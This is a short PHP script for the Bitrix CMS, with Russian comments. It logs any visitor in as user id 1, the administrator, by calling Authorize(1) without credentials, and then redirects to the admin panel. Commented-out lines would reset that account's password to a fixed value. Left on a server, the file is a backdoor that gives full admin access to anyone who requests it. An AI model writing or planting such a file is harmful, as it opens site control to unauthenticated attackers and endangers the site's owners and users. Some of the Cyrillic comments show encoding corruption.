<?
	require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php"); //подключаем хидер
global $USER; //объ¤вл¤ем переменную $USER
$USER->Authorize(1); //авторизовываем пользовател¤ под id = 1(в нашем случае админ)
LocalRedirect("/bitrix/admin/"); //отправл¤ем в админскую панель
// require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
// echo $USER->Update(1,array("PASSWORD"=>'Bitrix*123456'));
// echo $USER->LAST_ERROR;
require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
?>